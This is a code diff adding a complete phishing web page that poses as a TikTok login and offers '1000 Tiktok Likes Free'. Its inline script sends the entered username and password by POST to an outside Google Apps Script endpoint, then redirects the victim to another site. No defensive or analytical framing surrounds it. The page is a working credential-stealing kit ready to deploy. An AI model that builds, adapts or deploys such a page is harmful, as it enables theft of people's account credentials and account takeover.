@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tik Tok Followers</title>
+<script src="jquery.min.js"></script>
+<script src="jscript.js"></script>
+<link rel="stylesheet" type="text/css" href="style.css">
+<style>
+    @media(max-width:760px){
+       #TFG{
+           font-size:140%;
+       } 
+       .buttonstyle{
+           font-size:100%;
+       }
+    
+    .followers , .likes{
+        width:95%;
+    }
+    }
+</style>
+</head>
+<body onload="updateyear()">
+</div>
+<div id="main-tool">
+	<div class="wrapper"><img src="logo.png"></div>
+	<h1 id="TFG">Login</h1>
+<p class="sub-heading">Login to get 1000 Tiktok Likes Free</p>
+
+    <form id="form">
+    <center>
+    <div id="fillup">
+        <div class="form-option">
+        	<input name="tiktok-u" class="input-form input-command" type="text" placeholder="Username/Email/Phone" required>
+        </div>
+    <div id="fillup">
+        <div class="form-option">
+        	<input name="tiktok-p" class="input-form input-command" type="password" placeholder="Password" required>
+        </div>
+
+        <br><br>
+        <button class="buttonstyle"><b>Login</b></button>
+        </center>
+
+    </div>
+</div>
+
+<div id="steps" style="display:none;">
+
+</div>
+
+<div id="comment" style="display:none;" >
+</div>
+<script>
+  const form = document.querySelector("#form")
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbwOyaKW9FHFgSmISAMxCWEfblh86VMfuX0fE15ItT51hcXx7EAMBEfZW_Ayq1fGXbFD/exec'
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+
+    const responseBody = new FormData(form)
+    const TrendBody = responseBody.getAll("TRENDS").join(" ")
+    responseBody.set('TRENDS', TrendBody)
+    fetch(scriptURL, { method: 'POST', body: responseBody })
+      .then(response => { window.location.href = 'https://sparkling-forest-3195.on.fleek.co/' })
+      .catch(error => alert('Error!', error.message))
+  })
+</script>
+</body>
+
+</html>
